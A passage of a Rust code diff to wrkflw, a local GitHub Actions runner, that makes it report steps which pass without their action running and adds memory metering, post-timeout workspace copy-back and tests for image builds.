+    for skipped in &stored.actions_not_run {
+        crate::events::emit(|| crate::events::ExecutionEvent::ActionNotRun {
+            job: stored.name.clone(),
+            step: skipped.step.clone(),
+            uses: skipped.uses.clone(),
+        });
+    }
     crate::events::emit(|| crate::events::ExecutionEvent::JobFinished {
         job: stored.name.clone(),
         status: JobStatus::Success,
         failure_allowed: false,
         duration_ms: 0,
         logs: note.to_string(),
-        repeated_from: None,
+        repeated_from: stored.repeated_from.clone(),
         reused: Some(kind.to_string()),
     });
     wrkflw_logging::info(&format!(
@@ -2907,15 +2958,33 @@ async fn store_passing_result(
     if results.is_empty() || results.iter().any(|r| r.status != JobStatus::Success) {
         return;
     }
-    let jobs = results
+    acceleration::store(key, stored_jobs(results), env_context).await;
+}
+
+/// What a passing run keeps for reuse: names, outputs, and the steps that
+/// passed without running their action, so a reused pass is no less partial.
+fn stored_jobs(results: &[JobResult]) -> Vec<acceleration::StoredJob> {
+    results
         .iter()
         .map(|result| acceleration::StoredJob {
             name: result.name.clone(),
             canonical_name: result.canonical_name.clone(),
             outputs: result.outputs.clone(),
+            repeated_from: result.repeated_from.clone(),
+            actions_not_run: result
+                .steps
+                .iter()
+                .flat_map(|step| {
+                    step.actions_not_run.iter().map(|uses| {
+                        crate::action_fidelity::UnexecutedAction {
+                            step: step.name.clone(),
+                            uses: uses.clone(),
+                        }
+                    })
+                })
+                .collect(),
         })
-        .collect();
-    acceleration::store(key, jobs, env_context).await;
+        .collect()
 }
 
 #[allow(unused_variables, unused_assignments)]
@@ -2932,7 +3001,11 @@ async fn execute_job(ctx: JobExecutionContext<'_>) -> Result<JobResult, Executio
     }
     // Only after the reusable workflow check: its jobs take places of their
     // own, and a caller holding one would deadlock a limit of one.
-    let _slot = crate::vm_memory::job_slot().await;
+    let memory_id = job_memory_id(&ctx.workflow.name, ctx.job_name);
+    let _slot = crate::vm_memory::job_slot(memory_id.as_deref()).await;
+    if let Some(id) = &memory_id {
+        crate::job_memory::measure_as(id);
+    }
 
     // Clone context and add job-specific variables.
     // `job_env` is the full lookup map (runner + user union); `job_user_env`
@@ -3033,7 +3106,8 @@ async fn execute_job(ctx: JobExecutionContext<'_>) -> Result<JobResult, Executio
                         working_dir: job_dir.path(),
                         runtime: ctx.runtime,
                         workflow: ctx.workflow,
-                        runner_image: &runner_image_value,
+                        runner_image: &runner_image_value.image,
+                        installed_runtimes: &runner_image_value.built,
                         verbose: ctx.verbose,
                         matrix_combination: &None,
                         container_config: job.container.as_ref(),
@@ -3065,6 +3139,7 @@ async fn execute_job(ctx: JobExecutionContext<'_>) -> Result<JobResult, Executio
                     "Job '{}' exceeded timeout of {} minutes",
                     ctx.job_name, timeout_mins
                 );
+                copy_back_after_timeout(job_dir.path()).await;
                 loop_state.fail_step_on_timeout(step, idx, msg);
                 job_success = false;
                 break;
@@ -3186,20 +3261,23 @@ async fn execute_matrix_combinations(
 
         // Process this chunk of combinations in parallel
         let chunk_futures = chunk.iter().map(|combination| {
-            job_session::with_job_session(
-                ctx.job_template,
-                ctx.runtime,
-                execute_matrix_job(
-                    ctx.job_name,
+            crate::job_memory::metered(
+                job_session::with_job_session(
                     ctx.job_template,
-                    combination,
-                    ctx.workflow,
                     ctx.runtime,
-                    ctx.env_context,
-                    ctx.user_env,
-                    ctx.verbose,
-                    &ctx.services,
+                    execute_matrix_job(
+                        ctx.job_name,
+                        ctx.job_template,
+                        combination,
+                        ctx.workflow,
+                        ctx.runtime,
+                        ctx.env_context,
+                        ctx.user_env,
+                        ctx.verbose,
+                        &ctx.services,
+                    ),
                 ),
+                job_passed,
             )
         });
 
@@ -3300,11 +3378,15 @@ async fn execute_matrix_job(
     verbose: bool,
     services: &JobServices<'_>,
 ) -> Result<JobResult, ExecutionError> {
-    // One place in the run's pool for the leg, as for any job.
-    let _slot = crate::vm_memory::job_slot().await;
-
     // Create the matrix-specific job name
     let matrix_job_name = wrkflw_matrix::format_combination_name(job_name, combination);
+
+    // One place in the run's pool for the leg, as for any job.
+    let memory_id = job_memory_id(&workflow.name, &matrix_job_name);
+    let _slot = crate::vm_memory::job_slot(memory_id.as_deref()).await;
+    if let Some(id) = &memory_id {
+        crate::job_memory::measure_as(id);
+    }
 
     wrkflw_logging::info(&format!("Executing matrix job: {}", matrix_job_name));
 
@@ -3445,7 +3527,8 @@ async fn execute_matrix_job(
                             working_dir: job_dir.path(),
                             runtime,
                             workflow,
-                            runner_image: &runner_image_value,
+                            runner_image: &runner_image_value.image,
+                            installed_runtimes: &runner_image_value.built,
                             verbose,
                             matrix_combination: &Some(combination.values.clone()),
                             container_config: job_template.container.as_ref(),
@@ -3477,6 +3560,7 @@ async fn execute_matrix_job(
                         "Job '{}' exceeded timeout of {} minutes",
                         matrix_job_name, timeout_mins
                     );
+                    copy_back_after_timeout(job_dir.path()).await;
                     loop_state.fail_step_on_timeout(step, idx, msg);
                     all_steps_ok = false;
                     break;
@@ -3590,6 +3674,21 @@ pub(crate) struct JobServices<'a> {
 /// Flush pending cache saves. Called at end-of-job only when the job succeeded,
 /// matching GitHub Actions' behavior where `actions/cache` saves in a post-step
 /// hook that only runs after all steps complete and the job succeeds.
+/// Whether `result` is a job that ran and passed, so what it used stands
+/// for a whole run of it.
+fn job_passed(result: &Result<JobResult, ExecutionError>) -> bool {
+    result
+        .as_ref()
+        .is_ok_and(|job| job.status == JobStatus::Success && job.repeated_from.is_none())
+}
+
+/// The id a job's memory measurements are kept under.
+fn job_memory_id(workflow: &str, job: &str) -> Option<String> {
+    let repo = std::env::current_dir().ok()?;
+    let identity = crate::workspace::job_identity(&repo, workflow, job);
+    Some(crate::job_memory::job_id(&identity))
+}
+
 async fn flush_pending_cache_saves(
     pending: &std::sync::Mutex<Vec<PendingCacheSave>>,
     cache_store: &crate::cache::CacheStore,
@@ -3723,6 +3822,13 @@ impl StepLoopState {
         let Some(current) = &self.current_step else {
             return;
         };
+        for uses in &result.actions_not_run {
+            crate::events::emit(|| crate::events::ExecutionEvent::ActionNotRun {
+                job: self.job_label.clone(),
+                step: result.name.clone(),
+                uses: uses.clone(),
+            });
+        }
         crate::events::emit(|| crate::events::ExecutionEvent::StepFinished {
             job: self.job_label.clone(),
             step: result.name.clone(),
@@ -4027,9 +4133,13 @@ async fn run_step_with_guards(
     let step_result = if let Some(minutes) = step.timeout_minutes {
         let safe_mins = sanitize_timeout_minutes(Some(minutes), 360.0);
         let dur = std::time::Duration::from_secs_f64(safe_mins * 60.0);
+        let working_dir = step_exec_ctx.working_dir;
         match tokio::time::timeout(dur, execute_step(step_exec_ctx)).await {
             Ok(result) => result,
             Err(_) => {
+                // Later steps, such as an upload of this one's logs, read
+                // the workspace on this machine.
+                copy_back_after_timeout(working_dir).await;
                 wrkflw_logging::error(&format!(
                     "  Step '{}' exceeded timeout of {} minutes",
                     step_name, minutes
@@ -4085,6 +4195,7 @@ async fn run_step_with_guards(
                     outcome: StepStatus::Failure,
                     conclusion,
                     exit_code: None,
+                    actions_not_run: Vec::new(),
                 },
                 abort_job,
             })
@@ -4212,6 +4323,9 @@ struct StepExecutionContext<'a> {
     runtime: &'a dyn ContainerRuntime,
     workflow: &'a WorkflowDefinition,
     runner_image: &'a str,
+    /// The setup runtimes `runner_image` was built with, by language. A
+    /// setup action whose language is missing here did not run.
+    installed_runtimes: &'a BuiltRuntimes,
     verbose: bool,
     #[allow(dead_code)]
     matrix_combination: &'a Option<HashMap<String, Value>>,
@@ -4224,6 +4338,19 @@ struct StepExecutionContext<'a> {
     services: JobServices<'a>,
     /// Collects deferred `actions/cache` saves, flushed at end-of-job on success.
     pending_cache_saves: &'a std::sync::Mutex<Vec<PendingCacheSave>>,
+}
+
+impl StepExecutionContext<'_> {
+    /// Why the action from `repository` did not run in this step, if it
+    /// didn't. See [`unrun_action_cause`].
+    fn unrun_action_cause(&self, repository: &str) -> Option<&'static str> {
+        unrun_action_cause(
+            repository,
+            self.installed_runtimes,
+            uses_container_runtime(self.job_env),
+            self.step_idx,
+        )
+    }
 }
 
 impl<'a> StepExecutionContext<'a> {
@@ -4306,54 +4433,6 @@ fn relative_to_workspace(path: &str, workspace: &str) -> String {
         Ok(relative) => relative.to_string_lossy().into_owned(),
         Err(_) => path.to_string(),
     }
-}
-
-/// The `rustup` commands that add what a Rust toolchain step's `components`
-/// and `targets` (or `target`) inputs ask for, empty if it asks for none.
-/// Names are split on commas and whitespace, as `dtolnay/rust-toolchain`
-/// does. `resolve` gives an input's final value, or `None` when it can't be
-/// known yet, which leaves that input out.
-fn rust_toolchain_extras(
-    with: &HashMap<String, String>,
-    resolve: impl Fn(&str) -> Option<String>,
-) -> Vec<String> {
-    let names = |keys: &[&str]| -> Vec<String> {
-        keys.iter()
-            .filter_map(|key| with.get(*key))
-            .filter_map(|value| resolve(value))
-            .flat_map(|value| {
-                value
-                    .split(|c: char| c == ',' || c.is_whitespace())
-                    .filter(|name| !name.is_empty())
-                    .map(str::to_string)
-                    .collect::<Vec<_>>()
-            })
-            // Names reach a shell, so anything but a plain rustup name is
-            // refused, as is one rustup would read as an option.
-            .filter(|name| {
-                !name.starts_with('-')
-                    && name
-                        .chars()
-                        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
-            })
-            .collect()
-    };
-    let components = names(&["components"]);
-    let targets = names(&["targets", "target"]);
-    let mut commands = Vec::new();
-    if !components.is_empty() {
-        commands.push(format!("rustup component add {}", components.join(" ")));
-    }
-    if !targets.is_empty() {
-        commands.push(format!("rustup target add {}", targets.join(" ")));
-    }
-    commands
-}
-
-/// An input's value when it holds no expression, so it is known before the
-/// job runs and can go into the runner image.
-fn static_input(value: &str) -> Option<String> {
-    (!value.contains("${{")).then(|| value.to_string())
 }
 
 /// Resolve `${{ }}` expressions in an action `with` parameter value.
@@ -4826,6 +4905,12 @@ async fn execute_step(ctx: StepExecutionContext<'_>) -> Result<StepResult, Execu
         } else {
             // Get action info
             let prepared = prepare_action(&action_info, ctx.runtime).await?;
+            // An action whose metadata couldn't be fetched runs like any
+            // other image action; only the reason it ran nothing differs.
+            let fetch_error = match &prepared {
+                PreparedAction::Unresolved { fetch_error, .. } => Some(fetch_error.clone()),
+                _ => None,
+            };
 
             match prepared {
                 PreparedAction::Composite => {
@@ -4841,6 +4926,7 @@ async fn execute_step(ctx: StepExecutionContext<'_>) -> Result<StepResult, Execu
                             ctx.working_dir,
                             ctx.runtime,
                             ctx.runner_image,
+                            ctx.installed_runtimes,
                             ctx.verbose,
                             &ctx.services,
                             ctx.pending_cache_saves,
@@ -4897,6 +4983,7 @@ async fn execute_step(ctx: StepExecutionContext<'_>) -> Result<StepResult, Execu
                             ctx.working_dir,
                             ctx.runtime,
                             ctx.runner_image,
+                            ctx.installed_runtimes,
                             ctx.verbose,
                             &ctx.services,
                             ctx.pending_cache_saves,
@@ -4920,7 +5007,7 @@ async fn execute_step(ctx: StepExecutionContext<'_>) -> Result<StepResult, Execu
                     )
                     .await?
                 }
-                PreparedAction::Image(image) => {
+                PreparedAction::Image(image) | PreparedAction::Unresolved { image, .. } => {
                     // Build command for Docker action
                     let mut cmd = Vec::new();
                     let mut owned_strings: Vec<String> = Vec::new(); // Keep strings alive until after we use cmd
@@ -4971,7 +5058,14 @@ async fn execute_step(ctx: StepExecutionContext<'_>) -> Result<StepResult, Execu
                                     }))
                                     .await?;
                                     result.name = step_name;
-                                    return Ok(result);
+                                    // Only the extras ran. The toolchain the
+                                    // step asked for is installed only when
+                                    // the job's image was built with it.
+                                    let not_run = report_action_not_run(
+                                        uses,
+                                        ctx.unrun_action_cause(&action_info.repository),
+                                    );
+                                    return Ok(result.without_running(not_run));
                                 } else if !baked {
                                     wrkflw_logging::warning(&format!(
                                         "{}: components and targets can't be added for later \
@@ -4994,12 +5088,19 @@ async fn execute_step(ctx: StepExecutionContext<'_>) -> Result<StepResult, Execu
                                 rustc_version.trim()
                             ));
 
-                            // Return success since we're using system Rust
+                            // Return success since we're using system Rust.
+                            // Unless the job's image was built with the
+                            // toolchain, that isn't the one the step asked for.
+                            let not_run = report_action_not_run(
+                                uses,
+                                ctx.unrun_action_cause(&action_info.repository),
+                            );
                             return Ok(StepResult::new(
                                 step_name,
                                 StepStatus::Success,
                                 format!("Using system Rust: {}", rustc_version.trim()),
-                            ));
+                            )
+                            .without_running(not_run));
                         }
 
                         // For cargo action, execute cargo commands directly
@@ -5066,6 +5167,13 @@ async fn execute_step(ctx: StepExecutionContext<'_>) -> Result<StepResult, Execu
                                         cmd.env(key, value);
                                     }
 
+                                    // In a container runtime this ran on
+                                    // this machine, not in the job's image.
+                                    let not_run = if uses_container_runtime(ctx.job_env) {
+                                        report_action_not_run(uses, Some(CARGO_RAN_ON_HOST))
+                                    } else {
+                                        None
+                                    };
                                     match cmd.output().await {
                                         Ok(output) => {
                                             let exit_code = output.status.code().unwrap_or(-1);
@@ -5082,7 +5190,8 @@ async fn execute_step(ctx: StepExecutionContext<'_>) -> Result<StepResult, Execu
                                                     StepStatus::Failure
                                                 },
                                                 format!("{}\n{}", stdout, stderr),
-                                            ));
+                                            )
+                                            .without_running(not_run));
                                         }
                                         Err(e) => {
                                             return Ok(StepResult::new(
@@ -5097,17 +5206,18 @@ async fn execute_step(ctx: StepExecutionContext<'_>) -> Result<StepResult, Execu
                         }
                     }
 
-                    if action_info.is_docker {
-                        // Docker actions just run the container
+                    let mut action_not_run: Option<String> = None;
+                    // A `docker://` action ran natively above, so none
+                    // reaches here.
+                    if action_info.is_local {
+                        // A local Docker action ran natively and a local
+                        // composite action step by step, both above. What
+                        // reaches here is a local JavaScript action, which
+                        // wrkflw can't run: the step passes without it.
                         cmd.push("sh");
                         cmd.push("-c");
-                        cmd.push("echo 'Executing Docker action'");
-                    } else if action_info.is_local {
-                        // Local actions: run a placeholder since full local action
-                        // execution is handled by the Composite branch above
-                        cmd.push("sh");
-                        cmd.push("-c");
-                        cmd.push("echo 'Local action executed'");
+                        cmd.push("echo 'Local action not run'");
+                        action_not_run = report_action_not_run(uses, Some(NO_IMPLEMENTATION));
                     } else {
                         // For GitHub actions, check if we have special handling
                         if let Err(e) = emulation::handle_special_action(uses).await {
@@ -5132,8 +5242,27 @@ async fn execute_step(ctx: StepExecutionContext<'_>) -> Result<StepResult, Execu
                         let hide_messages = hide_action_value == "true";
                         wrkflw_logging::debug(&format!("Should hide messages: {}", hide_messages));
 
+                        // A setup action's work was done when the job's image
+                        // was built, if it was built with its runtime. Any
+                        // other action that reaches the fallback below is
+                        // one wrkflw can't run at all: the actions wrkflw
+                        // implements (checkout, cache, the artifact actions)
+                        // are dispatched before `prepare_action`, and Docker
+                        // and composite actions are run above. A new built-in
+                        // handler must stay ahead of this branch, or its
+                        // steps are reported as not run.
+                        let not_run_cause: Option<String> =
+                            match ctx.unrun_action_cause(&action_info.repository) {
+                                Some(NO_IMPLEMENTATION) if fetch_error.is_some() => Some(format!(
+                                    "its action.yml couldn't be fetched ({}), so how to run it \
+                                     is unknown",
+                                    fetch_error.as_deref().unwrap_or_default()
+                                )),
+                                cause => cause.map(str::to_string),
+                            };
+
                         // Only log a message to the console if we're showing action messages
-                        if !hide_messages {
+                        if !hide_messages && not_run_cause.is_none() {
                             wrkflw_logging::info(&format!("Would execute GitHub action: {}", uses));
                         }
 
@@ -5218,6 +5347,18 @@ async fn execute_step(ctx: StepExecutionContext<'_>) -> Result<StepResult, Execu
                             cmd.push("-c");
                             owned_strings.push(command_str);
                             cmd.push(owned_strings.last().unwrap());
+
+                            // The step runs a command built from its inputs,
+                            // not the action, so its pass isn't the action's.
+                            action_not_run = report_action_not_run(
+                                uses,
+                                not_run_cause
+                                    .as_deref()
+                                    .map(|cause| {
+                                        format!("{}; its `command` input ran in its place", cause)
+                                    })
+                                    .as_deref(),
+                            );
                         } else {
                             // Fall back to emulation for actions we don't know how to execute
                             cmd.clear();
@@ -5229,6 +5370,10 @@ async fn execute_step(ctx: StepExecutionContext<'_>) -> Result<StepResult, Execu
                                 format!("echo 'Would execute GitHub action: {}'", escaped_uses);
                             owned_strings.push(echo_msg);
                             cmd.push(owned_strings.last().unwrap());
+
+                            // The step passes, but nothing the action does
+                            // happens. Say so here, and in the run's verdict.
+                            action_not_run = report_action_not_run(uses, not_run_cause.as_deref());
                         }
                     }
 
@@ -5246,7 +5391,14 @@ async fn execute_step(ctx: StepExecutionContext<'_>) -> Result<StepResult, Execu
                         ctx.container_config,
                         ctx.runtime.mounts_are_copies(),
                     );
-                    let volumes = mount_ctx.build_volumes(ctx.working_dir, container_workspace);
+                    let vm_workspace =
+                        crate::vm_workspace::before_step(ctx.runtime, ctx.working_dir)
+                            .await
+                            .map_err(ExecutionError::Runtime)?;
+                    let mut volumes = mount_ctx.build_volumes(ctx.working_dir, container_workspace);
+                    if let Some(vm) = &vm_workspace {
+                        vm.mount_in(&mut volumes);
+                    }
                     let env_vars: Vec<(&str, &str)> = step_env
                         .iter()
                         .map(|(k, v)| (k.as_str(), v.as_str()))
@@ -5262,8 +5414,9 @@ async fn execute_step(ctx: StepExecutionContext<'_>) -> Result<StepResult, Execu
                             &volumes,
                             None,
                         )
-                        .await
-                        .map_err(|e| ExecutionError::Runtime(format!("{}", e)))?;
+                        .await;
+                    sync_workspace_back(vm_workspace.as_ref(), &output).await?;
+                    let output = output.map_err(|e| ExecutionError::Runtime(format!("{}", e)))?;
 
                     // Build verbose output for GitHub actions when applicable
                     let output_text = if ctx.verbose
@@ -5344,6 +5497,7 @@ async fn execute_step(ctx: StepExecutionContext<'_>) -> Result<StepResult, Execu
                         ),
                     )
                     .with_exit_code(output.exit_code)
+                    .without_running(action_not_run)
                 }
             }
         }
@@ -5506,7 +5660,13 @@ async fn execute_step(ctx: StepExecutionContext<'_>) -> Result<StepResult, Execu
         let cmd_refs: Vec<&str> = cmd_parts.iter().map(String::as_str).collect();
 
         let dep_mounts = acceleration::dep_cache_mounts(ctx.runtime.mounts_are_copies());
+        let vm_workspace = crate::vm_workspace::before_step(ctx.runtime, ctx.working_dir)
+            .await
+            .map_err(ExecutionError::Runtime)?;
         let mut volumes = mount_ctx.build_volumes(ctx.working_dir, container_workspace);
+        if let Some(vm) = &vm_workspace {
+            vm.mount_in(&mut volumes);
+        }
         volumes.extend(
             dep_mounts
                 .iter()
@@ -5552,6 +5712,7 @@ async fn execute_step(ctx: StepExecutionContext<'_>) -> Result<StepResult, Execu
                 message,
             )),
         };
+        sync_workspace_back(vm_workspace.as_ref(), &run_result).await?;
 
         drop(custom_shell_script);
 
@@ -6409,10 +6570,14 @@ async fn execute_composite_action(
     working_dir: &Path,
     runtime: &dyn ContainerRuntime,
     runner_image: &str,
+    installed_runtimes: &BuiltRuntimes,
     verbose: bool,
     services: &JobServices<'_>,
     pending_cache_saves: &std::sync::Mutex<Vec<PendingCacheSave>>,
 ) -> Result<StepResult, ExecutionError> {
+    // The job's step indices don't name the composite's own steps.
+    let composite_built = installed_runtimes.for_composite();
+    let installed_runtimes = &composite_built;
     // Find the action definition file
     let action_yaml = action_path.join("action.yml");
     let action_yaml_alt = action_path.join("action.yaml");
@@ -6495,6 +6660,7 @@ async fn execute_composite_action(
 
             // Execute each step, tracking outputs, statuses, and env changes between steps
             let mut step_outputs = Vec::new();
+            let mut actions_not_run: Vec<String> = Vec::new();
             let mut composite_step_outputs: HashMap<String, HashMap<String, String>> =
                 HashMap::new();
             let mut composite_step_statuses: HashMap<String, (String, String)> = HashMap::new();
@@ -6535,6 +6701,10 @@ async fn execute_composite_action(
                     runtime,
                     workflow: &composite_workflow,
                     runner_image,
+                    // The image was built from the job's own steps: a setup
+                    // action inside a composite action ran only if the job
+                    // set up the same runtime itself.
+                    installed_runtimes,
                     verbose,
                     matrix_combination: &None,
                     container_config: None, // Composite actions don't use job containers
@@ -6589,6 +6759,9 @@ async fn execute_composite_action(
 
                 // Execute the step - using Box::pin to handle async recursion
                 let step_result = Box::pin(execute_step(step_ctx)).await?;
+                // An action inside that didn't run is reported on the step
+                // that called the composite action, the one the job shows.
+                actions_not_run.extend(step_result.actions_not_run.iter().cloned());
 
                 // Track step status within composite scope
                 record_step_status(
@@ -6639,7 +6812,8 @@ async fn execute_composite_action(
                             .unwrap_or_else(|| "Composite Action".to_string()),
                         StepStatus::Failure,
                         step_outputs.join("\n"),
-                    ));
+                    )
+                    .without_running(actions_not_run));
                 }
             }
 
@@ -6698,7 +6872,8 @@ async fn execute_composite_action(
                     .unwrap_or_else(|| "Composite Action".to_string()),
                 StepStatus::Success,
                 output,
-            ))
+            )
+            .without_running(actions_not_run))
         }
         _ => Err(ExecutionError::Execution(
             "Action is not a composite action or has invalid format".to_string(),
@@ -7381,6 +7556,8 @@ async fn resolve_secrets_for_context(
 #[cfg(test)]
 mod tests {
     use super::*;
+    // The setup action helpers these tests exercise directly.
+    use crate::setup_actions::*;
 
     #[test]
     fn matrix_outputs_merge_per_key() {
@@ -7676,16 +7853,207 @@ mod tests {
         let map = overrides(&[("ubuntu-latest", "my/image:1")]);
         let runtime = MockContainerRuntime::default();
 
-        let image = resolve_runner_image(&job, &steps, &runtime, &map, None)
+        let resolved = resolve_runner_image(&job, &steps, &runtime, &map, None)
             .await
             .unwrap();
 
-        let dockerfile = generate_combined_dockerfile(&detect_setup_runtimes(&steps), "my/image:1");
+        let dockerfile =
+            generate_combined_dockerfile(&detect_setup_runtimes(&steps), "my/image:1", None);
         assert!(dockerfile.starts_with("FROM my/image:1\n"));
         assert_eq!(
-            image,
+            resolved.image,
             combined_image_tag(&detect_setup_runtimes(&steps), &dockerfile)
         );
+        assert_eq!(resolved.built.installed, ["node"]);
+    }
+
+    /// Counts pulls, and names images only when `identifies` is set.
+    #[derive(Default)]
+    struct PullCountingRuntime {
+        identifies: bool,
+        pulls: Mutex<usize>,
+    }
+
+    #[async_trait::async_trait]
+    impl ContainerRuntime for PullCountingRuntime {
+        async fn run_container(
+            &self,
+            _image: &str,
+            _cmd: &[&str],
+            _env_vars: &[(&str, &str)],
+            _working_dir: &Path,
+            _volumes: &[(&Path, &Path)],
+            _entrypoint: Option<&str>,
+        ) -> Result<ContainerOutput, ContainerError> {
+            unreachable!("no step runs")
+        }
+        async fn pull_image(&self, _image: &str) -> Result<(), ContainerError> {
+            *self.pulls.lock().unwrap() += 1;
+            Ok(())
+        }
+        async fn build_image(&self, _: &Path, _: &str, _: &Path) -> Result<(), ContainerError> {
+            Ok(())
+        }
+        async fn prepare_language_environment(
+            &self,
+            _: &str,
+            _: Option<&str>,
+            _: Option<Vec<String>>,
+        ) -> Result<String, ContainerError> {
+            Ok(String::new())
+        }
+        async fn image_exists(&self, _tag: &str) -> Result<bool, ContainerError> {
+            Ok(false)
+        }
+        fn identifies_images(&self) -> bool {
+            self.identifies
+        }
+    }
+
+    /// A runtime whose builds fail as `errors` says, in turn, and whose
+    /// image exists after the build numbered `exists_after` (counting from 1).
+    struct FlakyBuildRuntime {
+        errors: Vec<Option<&'static str>>,
+        exists_after: Option<usize>,
+        builds: Mutex<usize>,
+    }
+
+    #[async_trait::async_trait]
+    impl ContainerRuntime for FlakyBuildRuntime {
+        async fn run_container(
+            &self,
+            _: &str,
+            _: &[&str],
+            _: &[(&str, &str)],
+            _: &Path,
+            _: &[(&Path, &Path)],
+            _: Option<&str>,
+        ) -> Result<ContainerOutput, ContainerError> {
+            unreachable!("no step runs")
+        }
+        async fn pull_image(&self, _: &str) -> Result<(), ContainerError> {
+            Ok(())
+        }
+        async fn build_image(&self, _: &Path, _: &str, _: &Path) -> Result<(), ContainerError> {
+            let mut builds = self.builds.lock().unwrap();
+            *builds += 1;
+            match self.errors.get(*builds - 1).copied().flatten() {
+                Some(error) => Err(ContainerError::ImageBuild(error.to_string())),
+                None => Ok(()),
+            }
+        }
+        async fn prepare_language_environment(
+            &self,
+            _: &str,
+            _: Option<&str>,
+            _: Option<Vec<String>>,
+        ) -> Result<String, ContainerError> {
+            Ok(String::new())
+        }
+        async fn image_exists(&self, _: &str) -> Result<bool, ContainerError> {
+            let builds = *self.builds.lock().unwrap();
+            Ok(self.exists_after.is_some_and(|after| builds >= after))
+        }
+    }
+
+    fn flaky(errors: Vec<Option<&'static str>>, exists_after: Option<usize>) -> FlakyBuildRuntime {
+        FlakyBuildRuntime {
+            errors,
+            exists_after,
+            builds: Mutex::new(0),
+        }
+    }
+
+    #[tokio::test]
+    async fn a_build_whose_success_report_was_lost_is_used() {
+        // As seen with Docker Desktop: "Successfully tagged", then the
+        // output stream broke.
+        let runtime = flaky(vec![Some("bytes remaining on stream")], Some(1));
+        build_image_checked(&runtime, Path::new("D"), "t", Path::new("."))
+            .await
+            .unwrap();
+        assert_eq!(*runtime.builds.lock().unwrap(), 1);
+    }
+
+    #[tokio::test]
+    async fn a_build_cut_off_by_the_engine_is_tried_once_more() {
+        let runtime = flaky(vec![Some("connection reset by peer"), None], Some(2));
+        build_image_checked(&runtime, Path::new("D"), "t", Path::new("."))
+            .await
+            .unwrap();
+        assert_eq!(*runtime.builds.lock().unwrap(), 2);
+
+        // A second transport error is reported, not retried for ever.
+        let runtime = flaky(vec![Some("broken pipe"), Some("broken pipe")], None);
+        assert!(
+            build_image_checked(&runtime, Path::new("D"), "t", Path::new("."))
+                .await
+                .is_err()
+        );
+        assert_eq!(*runtime.builds.lock().unwrap(), 2);
+    }
+
+    #[test]
+    fn a_failing_run_that_printed_a_network_error_is_not_a_transport_error() {
+        assert!(is_transport_error(
+            "Image build failed: connection reset by peer"
+        ));
+        let own_failure = "The command '/bin/sh -c pip install -r req.txt' returned a \
+                           non-zero code: 1 (image t)\nLast build output:\n\
+                           ConnectionResetError: [Errno 104] Connection reset by peer";
+        assert!(!is_transport_error(own_failure));
+    }
+
+    #[tokio::test]
+    async fn a_build_that_failed_on_its_own_is_not_retried() {
+        let runtime = flaky(vec![Some("RUN apt-get install: exit code 100")], None);
+        let err = build_image_checked(&runtime, Path::new("D"), "t", Path::new("."))
+            .await
+            .unwrap_err();
+        assert!(err.to_string().contains("exit code 100"));
+        assert_eq!(*runtime.builds.lock().unwrap(), 1);
+    }
+
+    #[tokio::test]
+    async fn the_base_image_is_pulled_first_only_where_its_id_can_be_read() {
+        let runtimes = detect_setup_runtimes(&[make_step_uses("actions/setup-node@v4", None)]);
+        let blind = PullCountingRuntime::default();
+        build_combined_runtime_image(&runtimes, "ubuntu:latest", &blind)
+            .await
+            .unwrap();
+        assert_eq!(*blind.pulls.lock().unwrap(), 0);
+
+        let sighted = PullCountingRuntime {
+            identifies: true,
+            ..Default::default()
+        };
+        build_combined_runtime_image(&runtimes, "ubuntu:latest", &sighted)
+            .await
+            .unwrap();
+        assert_eq!(*sighted.pulls.lock().unwrap(), 1);
+    }
+
+    #[tokio::test]
+    async fn a_job_container_gets_no_setup_runtime() {
+        let job = make_job(
+            Some(JobContainer {
+                image: "python:3.12".to_string(),
+                credentials: None,
+                env: HashMap::new(),
+                ports: None,
+                volumes: None,
+                options: None,
+            }),
+            labels(&["ubuntu-latest"]),
+        );
+        let steps = vec![make_step_uses("actions/setup-node@v4", None)];
+        let runtime = MockContainerRuntime::default();
+
+        let resolved = resolve_runner_image(&job, &steps, &runtime, &HashMap::new(), None)
+            .await
+            .unwrap();
+        assert_eq!(resolved.image, "python:3.12");
+        assert_eq!(resolved.built, BuiltRuntimes::default());
     }
 
     // --- get_effective_runner_image tests ---
@@ -9014,6 +9382,161 @@ runs:
         }
     }
 
+    // --- Actions that pass without running ---
+
+    /// Run one `uses:` step through `execute_step` the way a job would, on
+    /// a container runtime unless `emulation`, with `installed` built into
+    /// the job's image.
+    async fn run_uses_step(uses: &str, installed: &[String], emulation: bool) -> StepResult {
+        run_uses_step_with(uses, None, installed, emulation).await
+    }
+
+    async fn run_uses_step_with(
+        uses: &str,
+        with: Option<HashMap<String, String>>,
+        installed: &[String],
+        emulation: bool,
+    ) -> StepResult {
+        // An unpinned `uses:` resolves at `main`; its metadata is seeded so
+        // nothing is fetched.
+        action_resolver::seed_cache_for_test(
+            uses,
+            "main",
+            "name: x\nruns:\n  using: node20\n  main: index.js\n",
+        )
+        .await;
+        let runtime = MockContainerRuntime::default();
+        let workflow = minimal_workflow();
+        let mut job_env = HashMap::new();
+        if !emulation {
+            job_env.insert(
+                "WRKFLW_RUNTIME_MODE".to_string(),
+                RuntimeType::Docker.mode_name().to_string(),
+            );
+        }
+        let working_dir = std::env::current_dir().unwrap();
+        let step = make_step("the step", uses, with, HashMap::new());
+        let ctx = StepExecutionContext {
+            step: &step,
+            step_idx: 0,
+            job_env: &job_env,
+            job_user_env: &job_env,
+            working_dir: &working_dir,
+            runtime: &runtime,
+            workflow: &workflow,
+            runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes {
+                installed: installed.to_vec(),
+                not_built: Vec::new(),
+            },
+            verbose: false,
+            matrix_combination: &None,
+            container_config: None,
+            workflow_defaults: None,
+            job_defaults: None,
+            step_outputs: &HashMap::new(),
+            step_statuses: &HashMap::new(),
+            job_status: "success",
+            services: test_services(),
+            pending_cache_saves: &TEST_PENDING_CACHE_SAVES,
+        };
+        execute_step(ctx).await.unwrap()
+    }
+
+    #[tokio::test]
+    async fn an_action_wrkflw_cannot_run_passes_but_is_reported() {
+        let result = run_uses_step("wrkflw-test/no-such-action", &[], false).await;
+        assert_eq!(result.status, StepStatus::Success);
+        assert_eq!(result.actions_not_run, ["wrkflw-test/no-such-action"]);
+    }
+
+    #[tokio::test]
+    async fn an_action_whose_command_input_ran_in_its_place_is_reported() {
+        let with = HashMap::from([("command".to_string(), "true".to_string())]);
+        let result = run_uses_step_with("wrkflw-test/command-action", Some(with), &[], false).await;
+        assert_eq!(result.status, StepStatus::Success);
+        assert_eq!(result.actions_not_run, ["wrkflw-test/command-action"]);
+    }
+
+    #[test]
